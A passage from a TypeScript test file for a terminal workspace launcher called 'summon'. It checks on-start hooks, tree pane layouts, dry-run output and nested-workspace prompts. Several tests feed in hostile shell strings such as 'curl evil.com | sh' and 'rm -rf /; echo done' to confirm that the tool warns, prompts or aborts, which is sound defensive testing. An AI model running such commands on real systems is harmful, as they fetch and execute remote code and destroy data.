      expect(onStartCalls[0]![1]).toEqual(
        expect.objectContaining({ cwd: "/tmp/workspace", stdio: "inherit" }),
      );

      // generateAppleScript should also have been called (workspace created)
      expect(mockGenerateAppleScript).toHaveBeenCalled();
      logSpy.mockRestore();
    });

    // BE-M3 (#594): on-start failure must warn and continue (not abort the launch)
    it("warns when on-start command fails but continues launch", async () => {
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
      mockExecSync.mockImplementation((cmd: string) => {
        if (cmd === "false") throw new Error("Command failed: exit code 1");
        return "";
      });
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
      const writeSpy = warnSpy;

      // Must NOT throw — launch should continue even when on-start fails
      await expect(launch("/tmp/workspace", { "on-start": "false" })).resolves.toBe("launched");
      // Must warn about the failure (UX-M2: with the warning prefix, on stderr as before)
      expect(warnSpy).toHaveBeenCalledWith("summon: warning: on-start command failed; continuing workspace launch\n");

      logSpy.mockRestore();
      warnSpy.mockRestore();
      writeSpy.mockRestore();
    });

    it("under SUMMON_DEBUG names the failed on-start command on stderr and continues", async () => {
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
      mockExecSync.mockImplementation((cmd: string) => {
        if (cmd === "false") throw new Error("exit code 1");
        return "";
      });
      vi.stubEnv("SUMMON_DEBUG", "1");
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
      const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
      try {
        await expect(launch("/tmp/workspace", { "on-start": "false" })).resolves.toBe("launched");
        expect(stderrSpy).toHaveBeenCalledWith("[debug] on-start command failed: false \u2014 exit code 1\n");
      } finally {
        vi.unstubAllEnvs();
        logSpy.mockRestore();
        stderrSpy.mockRestore();
      }
    });

    it("skips on-start in dry-run mode", async () => {
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

      await launch("/tmp/workspace", { "on-start": "echo setup", dryRun: true });

      const onStartCalls = mockExecSync.mock.calls.filter(
        (c: unknown[]) => c[0] === "echo setup",
      );
      expect(onStartCalls.length).toBe(0);
      logSpy.mockRestore();
    });

    it("warns about dangerous on-start from CLI --on-start flag (#169)", async () => {
      mockReadKVFile.mockReturnValue(new Map()); // no .summon file
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

      mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
        cb("y");
      });

      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

      await launch("/tmp/workspace", { "on-start": "curl evil.com | sh" });

      const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
      const metaWarning = warnMessages.find((m) => m.includes("shell metacharacters"));
      expect(metaWarning).toBeDefined();
      expect(metaWarning).toContain("on-start");
      expect(metaWarning).toContain("curl evil.com | sh");

      warnSpy.mockRestore();
      logSpy.mockRestore();
    });

    it("warns about dangerous on-start from machine config (#169)", async () => {
      mockReadKVFile.mockReturnValue(new Map()); // no .summon file
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"], ["on-start", "echo $(whoami)"]]));

      mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
        cb("y");
      });

      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

      await launch("/tmp/workspace");

      const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
      const metaWarning = warnMessages.find((m) => m.includes("shell metacharacters"));
      expect(metaWarning).toBeDefined();
      expect(metaWarning).toContain("on-start");

      warnSpy.mockRestore();
      logSpy.mockRestore();
    });

    it("preserves quoted arguments while resolving the executable path", async () => {
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", 'rg "hello world" src']]));
      mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
        if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "rg") {
          return "/usr/bin/rg\n";
        }
        if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "lazygit") {
          return "/usr/bin/lazygit\n";
        }
        return "";
      });

      await launch("/tmp/workspace");

      expect(mockGenerateAppleScript).toHaveBeenCalledWith(
        expect.objectContaining({
          editor: '/usr/bin/rg "hello world" src',
        }),
        "/tmp/workspace",
        null,
        undefined,
        "workspace",
        undefined,
        ANY_LAUNCH_ID,
      );
    });

    it("exits when user declines dangerous on-start from CLI (#169)", async () => {
      mockReadKVFile.mockReturnValue(new Map());
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

      mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
        cb("n");
      });

      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
      const stderrSpy = warnSpy;

      await expect(launch("/tmp/workspace", { "on-start": "rm -rf /; echo done" })).rejects.toThrow();
      const allWrites = stderrSpy.mock.calls.map((c) => String(c[0])).join("\n");
      expect(allWrites).toContain("Aborted.");

      warnSpy.mockRestore();
      stderrSpy.mockRestore();
    });

    it("exits on non-TTY when on-start from machine config has metacharacters (#169)", async () => {
      mockReadKVFile.mockReturnValue(new Map());
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"], ["on-start", "echo; evil"]]));

      const origIsTTY = process.stdin.isTTY;
      Object.defineProperty(process.stdin, "isTTY", { value: false, configurable: true });

      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

      try {
        await expect(launch("/tmp/workspace")).rejects.toThrow();
      } finally {
        Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
        warnSpy.mockRestore();
      }
    });

    it("does not warn about safe on-start values (#169)", async () => {
      mockReadKVFile.mockReturnValue(new Map());
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

      await launch("/tmp/workspace", { "on-start": "npm install" });

      const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
      expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);

      warnSpy.mockRestore();
      logSpy.mockRestore();
    });

    it("skips on-start metacharacter check in dry-run mode (#169)", async () => {
      mockReadKVFile.mockReturnValue(new Map());
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

      await launch("/tmp/workspace", { "on-start": "curl evil.com | sh", dryRun: true });

      const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
      expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);

      warnSpy.mockRestore();
      logSpy.mockRestore();
    });

    it("combines .summon dangerous commands with dangerous on-start in one warning (#169)", async () => {
      mockReadKVFile.mockReturnValue(
        new Map([["shell", "npm run dev; curl evil.com"]]),
      );
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

      mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
        cb("y");
      });

      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

      await launch("/tmp/workspace", { "on-start": "rm -rf / & echo" });

      const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
      const metaWarning = warnMessages.find((m) => m.includes("shell metacharacters"));
      expect(metaWarning).toBeDefined();
      // Both the .summon shell and the resolved on-start should be listed
      expect(metaWarning).toContain("shell");
      expect(metaWarning).toContain("on-start");

      warnSpy.mockRestore();
      logSpy.mockRestore();
    });
  });

});

describe("custom tree layout integration (Phase 4)", () => {
  describe("launch with tree layout", () => {
    it("uses generateTreeAppleScript for tree layouts in dry-run", async () => {
      mockIsCustomLayout.mockReturnValue(true);
      mockReadCustomLayout.mockReturnValue(
        new Map([
          ["tree", "main | sidebar"],
          ["pane.main", "claude"],
          ["pane.sidebar", "lazygit"],
        ]),
      );
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
      mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

      await launch("/tmp/workspace", { dryRun: true });

      expect(mockGenerateTreeAppleScript).toHaveBeenCalled();
      expect(mockGenerateAppleScript).not.toHaveBeenCalled();

      const allOutput = logSpy.mock.calls.map((c) => c[0] as string).join("\n");
      expect(allOutput).toContain("-- summon dry-run");
      expect(allOutput).toContain("tree layout");
      logSpy.mockRestore();
    });

    it("dry-run header includes tree-specific info (pane count)", async () => {
      mockIsCustomLayout.mockReturnValue(true);
      mockReadCustomLayout.mockReturnValue(
        new Map([
          ["tree", "(editor / shell) | sidebar"],
          ["pane.editor", "claude"],
          ["pane.shell", "npm run dev"],
          ["pane.sidebar", "lazygit"],
        ]),
      );
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
      mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

      await launch("/tmp/workspace", { dryRun: true });

      const allOutput = logSpy.mock.calls.map((c) => c[0] as string).join("\n");
      expect(allOutput).toContain("3 panes");
      logSpy.mockRestore();
    });

    it("uses generateTreeAppleScript for tree layouts in normal launch", async () => {
      mockIsCustomLayout.mockReturnValue(true);
      mockReadCustomLayout.mockReturnValue(
        new Map([
          ["tree", "main | sidebar"],
          ["pane.main", "claude"],
          ["pane.sidebar", "lazygit"],
        ]),
      );
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
      mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));

      await launch("/tmp/workspace");

      expect(mockGenerateTreeAppleScript).toHaveBeenCalled();
      expect(mockGenerateAppleScript).not.toHaveBeenCalled();
      // osascript should be called with the tree script
      expect(mockExecFileSync).toHaveBeenCalledWith(
        "osascript",
        [],
        expect.objectContaining({ input: expect.stringContaining("tree layout") }),
      );
    });

    it("resolves commands for tree leaf panes via ensureCommand", async () => {
      mockIsCustomLayout.mockReturnValue(true);
      mockReadCustomLayout.mockReturnValue(
        new Map([
          ["tree", "main | sidebar"],
          ["pane.main", "claude"],
          ["pane.sidebar", "lazygit"],
        ]),
      );
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
      mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));

      await launch("/tmp/workspace");

      // Both claude and lazygit should be checked via command -v
      expect(mockExecFileSync).toHaveBeenCalledWith(
        "/usr/bin/which", ["claude"], { encoding: "utf-8", stdio: ["ignore", "pipe", "ignore"], timeout: 5000, killSignal: "SIGKILL" },
      );
      expect(mockExecFileSync).toHaveBeenCalledWith(
        "/usr/bin/which", ["lazygit"], { encoding: "utf-8", stdio: ["ignore", "pipe", "ignore"], timeout: 5000, killSignal: "SIGKILL" },
      );
    });

    it("dry-run includes starship preset in header for tree layout", async () => {
      mockIsCustomLayout.mockReturnValue(true);
      mockReadCustomLayout.mockReturnValue(
        new Map([
          ["tree", "main | sidebar"],
          ["pane.main", "claude"],
          ["pane.sidebar", "lazygit"],
        ]),
      );
      mockGetPresetConfigPath.mockReturnValue("/mock/.config/summon/starship/gruvbox-rainbow.toml");
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "gruvbox-rainbow"]]));
      mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

      await launch("/tmp/workspace", { dryRun: true });

      const allOutput = logSpy.mock.calls.map((c) => c[0] as string).join("\n");
      expect(allOutput).toContain("Starship preset: gruvbox-rainbow");
      expect(allOutput).toContain("/mock/.config/summon/starship/gruvbox-rainbow.toml");
      expect(mockGenerateTreeAppleScript).toHaveBeenCalledWith(
        expect.anything(),
        "/tmp/workspace",
        "/mock/.config/summon/starship/gruvbox-rainbow.toml",
        undefined,
        "workspace",
        undefined,
        ANY_LAUNCH_ID,
      );
      logSpy.mockRestore();
    });

    it("built-in presets still use the traditional path", async () => {
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

      await launch("/tmp/workspace", { layout: "minimal" });

      expect(mockGenerateAppleScript).toHaveBeenCalled();
      expect(mockGenerateTreeAppleScript).not.toHaveBeenCalled();
    });

    it("traditional custom layout (no tree=) uses the existing path", async () => {
      mockIsCustomLayout.mockReturnValue(true);
      mockReadCustomLayout.mockReturnValue(
        new Map([
          ["editor", "vim"],
          ["sidebar", "htop"],
          ["panes", "2"],
        ]),
      );
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
      mockReadKVFile.mockReturnValue(new Map([["layout", "traditional"]]));

      await launch("/tmp/workspace");

      expect(mockGenerateAppleScript).toHaveBeenCalled();
      expect(mockGenerateTreeAppleScript).not.toHaveBeenCalled();
    });
  });

  describe("nested workspace warning", () => {
    let originalEnv: string | undefined;
    let originalIsTTY: boolean | undefined;

    beforeEach(() => {
      originalEnv = process.env.SUMMON_WORKSPACE;
      originalIsTTY = process.stdin.isTTY;
    });

    afterEach(() => {
      if (originalEnv === undefined) {
        delete process.env.SUMMON_WORKSPACE;
      } else {
        process.env.SUMMON_WORKSPACE = originalEnv;
      }
      Object.defineProperty(process.stdin, "isTTY", { value: originalIsTTY, writable: true });
    });

    it("warns and prompts when SUMMON_WORKSPACE is set", async () => {
      process.env.SUMMON_WORKSPACE = "1";
      Object.defineProperty(process.stdin, "isTTY", { value: true, writable: true });
      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
      // User answers "y" to proceed
      mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("y"));

      await launch("/tmp/workspace");

      // UX-M2: only the first line gains the prefix; the continuation lines and the prompt are unchanged.
      expect(warnSpy.mock.calls.map((c) => c[0]).slice(0, 3)).toEqual([
        "summon: warning: You're inside an existing summon workspace.\n",
        "Launching here will nest splits inside this pane, which can get messy.\n",
        "Tip: Use --new-window to open in a separate window instead.\n\n",
      ]);
      expect(mockExecFileSync).toHaveBeenCalled();
      warnSpy.mockRestore();
    });

    it("exits when user declines nested launch", async () => {
      process.env.SUMMON_WORKSPACE = "1";
      Object.defineProperty(process.stdin, "isTTY", { value: true, writable: true });
      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
      // User answers "n"
      mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("n"));

      // UX-L3: a quiet user cancel (exit 130 at the top level), not an error with the debug hint.
      await expect(launch("/tmp/workspace")).rejects.toBeInstanceOf(PromptCancelled);
      expect(warnSpy.mock.calls.map((c) => String(c[0])).join("")).not.toContain("summon: error:");
      warnSpy.mockRestore();
    });

    it("skips warning when --new-window is set", async () => {
      process.env.SUMMON_WORKSPACE = "1";
      Object.defineProperty(process.stdin, "isTTY", { value: true, writable: true });
      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

      await launch("/tmp/workspace", { "new-window": "true" });

      expect(warnSpy).not.toHaveBeenCalledWith(expect.stringContaining("existing summon workspace"));
      warnSpy.mockRestore();
    });

    it("skips the warning and the prompt for a Rex launch, which creates a session and never splits the caller's pane (F14)", async () => {
      process.env.SUMMON_WORKSPACE = "1";
      Object.defineProperty(process.stdin, "isTTY", { value: true, writable: true });
      mockResolveBackendForLaunch.mockReturnValue({ ok: true, backend: "rex", placement: "inside-rex", server: "unix:///tmp/rex.sock", rexBinary: "/usr/local/bin/rex", notices: [] });
      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
      mockQuestion.mockClear();

      await expect(launch("/tmp/workspace")).resolves.toBe("launched");
      expect(rexLaunches).toHaveLength(1);

      expect(warnSpy).not.toHaveBeenCalledWith(expect.stringContaining("existing summon workspace"));
      expect(mockQuestion).not.toHaveBeenCalledWith(expect.stringContaining("Continue anyway?"), expect.anything());
      warnSpy.mockRestore();
    });

    it("skips warning when not in a TTY", async () => {
      process.env.SUMMON_WORKSPACE = "1";
      Object.defineProperty(process.stdin, "isTTY", { value: false, writable: true });
      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

      await launch("/tmp/workspace");

      expect(warnSpy).not.toHaveBeenCalledWith(expect.stringContaining("existing summon workspace"));
      warnSpy.mockRestore();
    });

    it("skips warning in dry-run mode", async () => {
      process.env.SUMMON_WORKSPACE = "1";
      Object.defineProperty(process.stdin, "isTTY", { value: true, writable: true });
      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

      await launch("/tmp/workspace", { dryRun: true });

      expect(warnSpy).not.toHaveBeenCalledWith(expect.stringContaining("existing summon workspace"));
      warnSpy.mockRestore();
    });
  });
});

describe("launch feedback (#144)", () => {
  it("prints a feedback message to stderr on successful non-dry-run launch (FE-M5 #549)", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await launch("/tmp/workspace");

    const stderrMessages = [
      ...stderrSpy.mock.calls.map(c => String(c[0])),
      ...errorSpy.mock.calls.flat().map(String),
    ].join("\n");
    expect(stderrMessages.toLowerCase()).toMatch(/launch|workspace|summon/i);
    stderrSpy.mockRestore();
    errorSpy.mockRestore();
  });

  it("does NOT print launch feedback in dry-run mode", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true });

    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
    const feedbackMsg = warnMessages.find((m) => m.toLowerCase().includes("summon"));
    expect(feedbackMsg).toBeUndefined();
    warnSpy.mockRestore();
    logSpy.mockRestore();
  });
});

describe("dry-run singular pane label (#168)", () => {
  it("uses singular 'pane' in tree dry-run header when only 1 leaf pane", async () => {
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(
      new Map([
        ["tree", "solo"],
        ["pane.solo", "claude"],
      ]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true });

    const allOutput = logSpy.mock.calls.map((c) => c[0] as string).join("\n");
    expect(allOutput).toContain("1 pane");
    expect(allOutput).not.toContain("1 panes");
    logSpy.mockRestore();
  });

  it("uses singular 'pane' in traditional dry-run header when minimal layout has 1 pane", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true, layout: "minimal" });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).toContain("1 editor pane,");
    expect(output).not.toContain("1 editor panes");
    logSpy.mockRestore();
  });
});

describe("env vars passed to script generator (#168)", () => {
  it("passes env vars to generateAppleScript in traditional layout", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    await launch("/tmp/workspace", { env: ["NODE_ENV=production"] });

    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.anything(),
      "/tmp/workspace",
      null,
      { NODE_ENV: "production" },
      "workspace",
      undefined,
      ANY_LAUNCH_ID,
    );
  });

  it("passes env vars to generateAppleScript in traditional dry-run", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true, env: ["NODE_ENV=production"] });

    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.anything(),
      "/tmp/workspace",
      null,
      { NODE_ENV: "production" },
      "workspace",
      undefined,
      ANY_LAUNCH_ID,
    );
    logSpy.mockRestore();
  });

  it("passes env vars to generateTreeAppleScript in tree layout", async () => {
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(
      new Map([
        ["tree", "main | sidebar"],
        ["pane.main", "claude"],
        ["pane.sidebar", "lazygit"],
      ]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));

    await launch("/tmp/workspace", { env: ["NODE_ENV=test"] });

    expect(mockGenerateTreeAppleScript).toHaveBeenCalledWith(
      expect.anything(),
      "/tmp/workspace",
      null,
      { NODE_ENV: "test" },
      "workspace",
      undefined,
      ANY_LAUNCH_ID,
    );
  });

  it("passes env vars to generateTreeAppleScript in tree dry-run", async () => {
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(
      new Map([
        ["tree", "main | sidebar"],
        ["pane.main", "claude"],
        ["pane.sidebar", "lazygit"],
      ]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true, env: ["MY_VAR=hello"] });

    expect(mockGenerateTreeAppleScript).toHaveBeenCalledWith(
      expect.anything(),
      "/tmp/workspace",
      null,
      { MY_VAR: "hello" },
      "workspace",
      undefined,
      ANY_LAUNCH_ID,
    );
    logSpy.mockRestore();
  });
});

describe("on-start metacharacter confirmation (#168)", () => {
  let origIsTTY: boolean | undefined;

  beforeEach(() => {
    origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
  });

  afterEach(() => {
    Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
  });

  it("prompts when .summon file has on-start with shell metacharacters", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["on-start", "echo done; curl evil.com"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace");

    expect(warnSpy).toHaveBeenCalledWith(
      expect.stringContaining("shell metacharacters"),
    );
    warnSpy.mockRestore();
    logSpy.mockRestore();
  });
});

describe("tree dry-run without starship preset (#168)", () => {
  it("does not include starship line in tree dry-run header when no preset", async () => {
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(
      new Map([
        ["tree", "main | sidebar"],
        ["pane.main", "claude"],
        ["pane.sidebar", "lazygit"],
      ]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).not.toContain("Starship preset");
    expect(mockGenerateTreeAppleScript).toHaveBeenCalledWith(
      expect.anything(),
      "/tmp/workspace",
      null,
      undefined,
      "workspace",
      undefined,
      ANY_LAUNCH_ID,
    );
    logSpy.mockRestore();
  });
});

describe("W1: tree pane.* commands metacharacter check (#190)", () => {
  let origIsTTY: boolean | undefined;

  beforeEach(() => {
    origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
  });

  afterEach(() => {
    Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
  });

  it("prompts when tree pane command contains shell metacharacters", async () => {
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(
      new Map([
        ["tree", "main | sidebar"],
        ["pane.main", "vim"],
        ["pane.sidebar", "curl evil.com | sh"],
      ]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace");

    expect(warnSpy).toHaveBeenCalledWith(
      expect.stringContaining("shell metacharacters"),
    );
    warnSpy.mockRestore();
  });

  it("exits on non-TTY when tree pane command has metacharacters", async () => {
    Object.defineProperty(process.stdin, "isTTY", { value: false, configurable: true });
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(
      new Map([
        ["tree", "main | sidebar"],
        ["pane.main", "vim"],
        ["pane.sidebar", "npm run dev; curl evil.com"],
      ]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/tmp/workspace")).rejects.toThrow();

    warnSpy.mockRestore();
  });

  it("does not prompt when tree pane commands are safe", async () => {
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(
      new Map([
        ["tree", "main | sidebar"],
        ["pane.main", "vim"],
        ["pane.sidebar", "lazygit"],
      ]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace");

    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
    expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);
    warnSpy.mockRestore();
  });

  it("skips tree pane metacharacter check in dry-run mode", async () => {
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(
      new Map([
        ["tree", "main | sidebar"],
        ["pane.main", "vim"],
        ["pane.sidebar", "curl evil.com | sh"],
      ]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace", { dryRun: true });

    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
    expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);
    logSpy.mockRestore();
    warnSpy.mockRestore();
  });

  it("includes tree pane commands alongside .summon dangerous commands", async () => {
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(
      new Map([
        ["tree", "main | sidebar"],
        ["pane.main", "vim"],
        ["pane.sidebar", "curl evil.com | sh"],
      ]),
    );
    // Project file also has a dangerous on-start
    mockReadKVFile.mockReturnValue(
      new Map([
        ["layout", "mywork"],
        ["on-start", "rm -rf / & echo"],
      ]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace");

    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
    const metaWarning = warnMessages.find((m) => m.includes("shell metacharacters"));
    expect(metaWarning).toBeDefined();
    // Both sources should be listed
    expect(metaWarning).toContain("pane.sidebar");
    expect(metaWarning).toContain("on-start");

    warnSpy.mockRestore();
    logSpy.mockRestore();
  });

  it("prompts for an inline tree command and clears it when skipped", async () => {
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(
      new Map([
        ["tree", '"curl evil.com | sh" | sidebar'],
        ["pane.sidebar", "lazygit"],
      ]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace");

    expect(mockQuestion).toHaveBeenCalled();
    expect(JSON.stringify(mockGenerateTreeAppleScript.mock.calls.at(-1)?.[0]))
      .not.toContain("curl evil.com | sh");
    warnSpy.mockRestore();
  });
});

describe("W9: ensureCommand install prompt defaults to No (#190)", () => {
  it("exits when user presses Enter (default is deny) at install prompt", async () => {
    let claudeCallCount = 0;
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "claude") {
        claudeCallCount++;
        if (claudeCallCount <= 1) throw new Error("not found");
        return "/usr/bin/claude\n";
      }
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "claude"]]));

    // User presses Enter (empty string)
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("");
    });

    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toThrow();

    logSpy.mockRestore();
  });

  it("shows [y/N] prompt (default No) for install", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "claude") throw new Error("not found");
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "claude"]]));

